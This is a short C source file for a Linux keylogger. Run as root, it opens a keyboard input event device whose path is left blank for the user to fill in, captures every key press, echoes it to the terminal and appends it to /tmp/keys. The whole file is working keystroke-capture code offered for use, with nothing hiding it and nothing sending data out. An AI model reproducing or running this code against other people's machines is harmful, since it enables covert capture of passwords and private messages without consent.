#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include "event_codes.h"

int main(void){

    if (geteuid() != 0) {
        fprintf(stderr, "\033[31;1m[-] This program must be run as root.\n");
        exit(EXIT_FAILURE);
    }

    const char *device = ""; // Your event file here.
    int fd = open(device, O_RDONLY);
    struct input_event event;

    if(fd == -1){
        printf("\033[31;1m[-] Could not open the file on the desired device.\n");
        exit(EXIT_FAILURE);
    }

    FILE *file;
    file = fopen("/tmp/keys", "a");
    if (file == NULL) {
        printf("\033[31;1m[-] Error creating the file.");
        exit(EXIT_FAILURE);
    }else{
        printf("\033[32;1m\n[!] A file called keys was created in \"/tmp\"!\n\n");
    }

    while (1) {
        if (read(fd, &event, sizeof(struct input_event)) < 0) {
            printf("\033[31;1m[-] Error reading event.\n");
            exit(EXIT_FAILURE);
        }

        if(event.type == EV_KEY && event.value == 1){
            const char *key = keymap[event.code]; 
            printf("\033[32;1m[+] Key pressed:\033[0m %s\n", key);
            fprintf(file, "%s\n", key);
            fflush(file);
        }
    }

    close(fd);
    fclose(file);

    return EXIT_SUCCESS;
}    
